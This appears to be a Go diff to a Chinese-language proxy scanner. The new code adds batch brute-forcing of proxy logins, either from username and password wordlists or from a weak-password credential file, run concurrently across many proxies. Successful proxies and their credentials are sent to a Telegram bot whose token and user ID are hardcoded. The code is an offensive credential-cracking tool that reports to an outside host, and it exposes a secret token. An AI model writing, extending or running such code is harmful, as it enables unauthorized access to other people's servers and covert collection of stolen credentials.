@@ -25,19 +25,21 @@ import (
 )
 
 const (
-	defaultProxiesFile = "proxies.txt"
-	outputDir          = "proxy_output"
-	configYmlFile      = "config.yml"
-	speedTestURL       = "https://speed.cloudflare.com/__down?bytes=200000"
-	speedTestSizeBytes = 200000
-	telegramBotToken   = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
-	telegramUserID     = "7697235358"
+	defaultProxiesFile    = "proxies.txt"
+	defaultUsernamesFile  = "username.txt"
+	defaultPasswordsFile  = "password.txt"
+	defaultCredentialsFile = "proxy_credentials.txt"
+	outputDir             = "proxy_output"
+	configYmlFile         = "config.yml"
+	speedTestURL          = "https://speed.cloudflare.com/__down?bytes=200000"
+	speedTestSizeBytes    = 200000
+	telegramBotToken      = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
+	telegramUserID        = "7697235358"
 )
 
 var (
 	telegramClient = &http.Client{Timeout: 30 * time.Second}
-	// 新增: 安全模式开关
-	insecureMode = false
+	insecureMode   = false
 )
 
 type NezhaConfig struct {
@@ -54,7 +56,7 @@ func main() {
 |_____|_|_|_|___|_| |___|___|___|_| |___|  _|___|___|
                                       |_|          
 	`)
-	fmt.Println("================== Universal Proxy Scanner v14.0 (Final Choice) ==================")
+	fmt.Println("================== Universal Proxy Scanner v15.0 (Final Full) ==================")
 
 	fmt.Println("正在获取您的真实公网IP地址...")
 	realIP, err := getPublicIP()
@@ -68,19 +70,18 @@ func main() {
 	testURL, expectedBody := selectTestTarget(reader)
 
 	for {
-		fmt.Println("\n--- 协议选择 ---")
+		fmt.Println("\n--- 主菜单 ---")
 		fmt.Println("1: SOCKS5 代理模式")
 		fmt.Println("2: HTTP 代理模式")
 		fmt.Println("3: HTTPS 代理模式")
 		fmt.Println("4: 切换测试目标")
-		// 新增选项
 		if insecureMode {
 			fmt.Println("5: 切换到安全模式 (Strict TLS)")
 		} else {
 			fmt.Println("5: 切换到兼容模式 (Skip TLS Verify)")
 		}
 		fmt.Println("6: 退出")
-		fmt.Print("请选择要测试的代理协议: ")
+		fmt.Print("请选择操作: ")
 
 		typeChoiceStr, _ := reader.ReadString('\n')
 		typeChoice, _ := strconv.Atoi(strings.TrimSpace(typeChoiceStr))
@@ -192,7 +193,7 @@ func normalizeProxyURL(rawAddr string, defaultScheme string) (*url.URL, error) {
 }
 
 func handleSingleProxyTest(proxyType, testURL, expectedBody, realIP string, reader *bufio.Reader) {
-	fmt.Printf("输入代理地址 (例如: 1.2.3.4:8080): ")
+	fmt.Printf("输入代理地址 (例如: user:pass@1.2.3.4:8080): ")
 	proxyInput, _ := reader.ReadString('\n')
 	proxyInput = strings.TrimSpace(proxyInput)
 	if proxyInput == "" { return }
@@ -228,8 +229,23 @@ func handleSingleProxyTest(proxyType, testURL, expectedBody, realIP string, read
 func handleBatchScan(proxyType, testURL, expectedBody, realIP string, reader *bufio.Reader) {
 	fmt.Printf("输入代理列表文件名 (默认: %s): ", defaultProxiesFile)
 	proxyFilename, _ := reader.ReadString('\n')
-	proxyFilename = strings.TrimSpace(proxyFilename)
-	if proxyFilename == "" { proxyFilename = defaultProxiesFile }
+	if proxyFilename = strings.TrimSpace(proxyFilename); proxyFilename == "" { proxyFilename = defaultProxiesFile }
+
+	fmt.Print("选择凭据模式 (1:无凭据, 2:独立凭据文件, 3:弱密码文件): ")
+	authModeStr, _ := reader.ReadString('\n')
+	authMode, _ := strconv.Atoi(strings.TrimSpace(authModeStr))
+
+	usernamesFile, passwordsFile, credentialsFile := defaultUsernamesFile, defaultPasswordsFile, defaultCredentialsFile
+	if authMode == 2 {
+		fmt.Printf("输入用户文件名 (默认: %s): ", defaultUsernamesFile)
+		if f, _ := reader.ReadString('\n'); strings.TrimSpace(f) != "" { usernamesFile = strings.TrimSpace(f) }
+		fmt.Printf("输入密码文件名 (默认: %s): ", defaultPasswordsFile)
+		if f, _ := reader.ReadString('\n'); strings.TrimSpace(f) != "" { passwordsFile = strings.TrimSpace(f) }
+	} else if authMode == 3 {
+		fmt.Printf("输入弱密码文件名 (默认: %s): ", defaultCredentialsFile)
+		if f, _ := reader.ReadString('\n'); strings.TrimSpace(f) != "" { credentialsFile = strings.TrimSpace(f) }
+	}
+	
 	fmt.Print("输入并发数 (默认100): ")
 	concurrencyStr, _ := reader.ReadString('\n')
 	concurrency, err := strconv.Atoi(strings.TrimSpace(concurrencyStr))
@@ -242,10 +258,10 @@ func handleBatchScan(proxyType, testURL, expectedBody, realIP string, reader *bu
 	minSpeedStr, _ := reader.ReadString('\n')
 	minSpeed, err := strconv.ParseFloat(strings.TrimSpace(minSpeedStr), 64)
 	if err != nil { minSpeed = 50.0 }
-	batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename, concurrency, time.Duration(timeout)*time.Second, minSpeed)
+	batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename, concurrency, time.Duration(timeout)*time.Second, minSpeed, authMode, usernamesFile, passwordsFile, credentialsFile)
 }
 
-func batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename string, concurrency int, timeout time.Duration, minSpeed float64) {
+func batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename string, concurrency int, timeout time.Duration, minSpeed float64, authMode int, usernamesFile, passwordsFile, credentialsFile string) {
 	proxiesFile, err := os.Open(proxyFilename)
 	if err != nil { return }
 	defer proxiesFile.Close()
@@ -275,14 +291,9 @@ func batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename string, c
 		go func() {
 			defer wg.Done()
 			for proxyAddr := range proxyChan {
-				proxyURL, err := normalizeProxyURL(proxyAddr, proxyType)
-				if err != nil { bar.Add(1); continue }
-				success, httpClient, _ := checkConnection(proxyURL, testURL, expectedBody, timeout, realIP)
-				if success {
-					speed, _ := performSpeedTest(httpClient)
-					if speed >= minSpeed {
-						resultsChan <- fmt.Sprintf("%s # %.2f KB/s", proxyURL.String(), speed)
-					}
+				res, _ := testProxy(proxyType, proxyAddr, testURL, expectedBody, timeout, realIP, authMode, usernamesFile, passwordsFile, credentialsFile)
+				if res != nil && res.Speed >= minSpeed {
+					resultsChan <- res.String()
 				}
 				bar.Add(1)
 			}
@@ -308,6 +319,63 @@ func batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename string, c
 	go sendTelegramDocument(outputPath, summaryCaption)
 }
 
+type ScanResult struct {
+	URL   *url.URL
+	Speed float64
+}
+
+func (r *ScanResult) String() string {
+	return fmt.Sprintf("%s # %.2f KB/s", r.URL.String(), r.Speed)
+}
+
+func testProxy(proxyType, rawProxyAddr, testURL, expectedBody string, timeout time.Duration, realIP string, authMode int, usernamesFile, passwordsFile, credentialsFile string) (*ScanResult, error) {
+	checkAndFormat := func(auth *proxy.Auth) (*ScanResult, error) {
+		var finalAddr string
+		if auth != nil && auth.User != "" {
+			finalAddr = fmt.Sprintf("%s:%s@%s", url.QueryEscape(auth.User), url.QueryEscape(auth.Password), rawProxyAddr)
+		} else {
+			finalAddr = rawProxyAddr
+		}
+		proxyURL, err := normalizeProxyURL(finalAddr, proxyType)
+		if err != nil { return nil, err }
+		
+		success, httpClient, err := checkConnection(proxyURL, testURL, expectedBody, timeout, realIP)
+		if !success { return nil, err }
+		
+		speed, _ := performSpeedTest(httpClient)
+		return &ScanResult{URL: proxyURL, Speed: speed}, nil
+	}
+
+	switch authMode {
+	case 1:
+		return checkAndFormat(nil)
+	case 2:
+		usernames, _ := readLines(usernamesFile)
+		passwords, _ := readLines(passwordsFile)
+		if len(usernames) == 0 { usernames = []string{""} }
+		if len(passwords) == 0 { passwords = []string{""} }
+		for _, user := range usernames {
+			for _, pass := range passwords {
+				if user == "" && pass == "" { continue }
+				if res, err := checkAndFormat(&proxy.Auth{User: user, Password: pass}); err == nil {
+					return res, nil
+				}
+			}
+		}
+	case 3:
+		creds, _ := readLines(credentialsFile)
+		for _, cred := range creds {
+			parts := strings.SplitN(cred, ":", 2)
+			if len(parts) == 2 {
+				if res, err := checkAndFormat(&proxy.Auth{User: parts[0], Password: parts[1]}); err == nil {
+					return res, nil
+				}
+			}
+		}
+	}
+	return nil, fmt.Errorf("未找到有效凭据")
+}
+
 
 func checkConnection(proxyURL *url.URL, testURL, expectedBody string, timeout time.Duration, realIP string) (bool, *http.Client, error) {
 	transport := &http.Transport{MaxIdleConnsPerHost: 100}
@@ -321,19 +389,13 @@ func checkConnection(proxyURL *url.URL, testURL, expectedBody string, timeout ti
 	default:
 		return false, nil, fmt.Errorf("不支持的代理协议: %s", proxyURL.Scheme)
 	}
-
 	parsedTestURL, err := url.Parse(testURL)
 	if err != nil { return false, nil, fmt.Errorf("无效的测试URL: %v", err) }
-	
-	// **最终修复**: 动态 TLS 配置
-	tlsConfig := &tls.Config{}
+	tlsConfig := &tls.Config{ InsecureSkipVerify: insecureMode }
 	if parsedTestURL.Scheme == "https" {
 		tlsConfig.ServerName = parsedTestURL.Hostname()
 	}
-	// 根据全局开关决定是否忽略证书错误
-	tlsConfig.InsecureSkipVerify = insecureMode
 	transport.TLSClientConfig = tlsConfig
-
 	httpClient := &http.Client{
 		Transport: transport,
 		Timeout:   timeout,
@@ -348,7 +410,6 @@ func checkConnection(proxyURL *url.URL, testURL, expectedBody string, timeout ti
 	if resp.StatusCode != http.StatusOK { return false, nil, fmt.Errorf("bad status: %s", resp.Status) }
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil { return false, nil, fmt.Errorf("无法读取响应体") }
-
 	if expectedBody == "ipip.net" {
 		bodyString := string(body)
 		var extractedIP string
@@ -382,6 +443,16 @@ func performSpeedTest(httpClient *http.Client) (float64, error) {
 	if duration == 0 { return 99999, nil }
 	speedKBps := (float64(speedTestSizeBytes) / 1024) / duration
 	return speedKBps, nil
+}
+
+func readLines(path string) ([]string, error) {
+	file, err := os.Open(path)
+	if err != nil { return nil, err }
+	defer file.Close()
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() { lines = append(lines, scanner.Text()) }
+	return lines, scanner.Err()
 }
 
 func sendTelegramDocument(filePath string, caption string) {
